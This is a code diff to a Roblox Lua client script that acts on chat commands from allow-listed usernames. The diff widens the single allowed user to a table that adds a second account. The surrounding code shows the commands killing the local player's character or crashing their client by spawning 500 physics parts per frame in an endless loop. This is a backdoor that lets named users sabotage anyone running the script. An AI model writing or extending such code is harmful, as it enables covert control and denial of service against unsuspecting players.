@@ -2,7 +2,11 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
-local ALLOWED_USERNAME = "ShadowBoxNeckBreaker"
+local ALLOWED_USERNAMES = {
+	["ShadowBoxNeckBreaker"] = true,
+	["TiaBrewer"] = true
+}
+
 local crashing = false
 
 local function killSelf()
@@ -56,7 +60,7 @@ local function crashSelf()
 	coroutine.wrap(function()
 		while crashing do
 			RunService.Heartbeat:Wait()
-			for _ = 1, 500 do -- 💥 Spawn 500 parts PER FRAME
+			for _ = 1, 500 do -- Spawn 500 parts per frame
 				local part = Instance.new("Part")
 				part.Size = Vector3.new(math.random(1, 5), math.random(1, 5), math.random(1, 5))
 				part.Anchored = false
@@ -77,7 +81,7 @@ local function onPlayerChatted(player, msg)
 	local lowerMsg = msg:lower()
 	local command, param = lowerMsg:match("^(%S+)%s*(.*)$")
 
-	if player.Name == ALLOWED_USERNAME and LocalPlayer.Name ~= ALLOWED_USERNAME then
+	if ALLOWED_USERNAMES[player.Name] and LocalPlayer.Name ~= player.Name then
 		if command == "!killusers" then
 			killSelf()
 
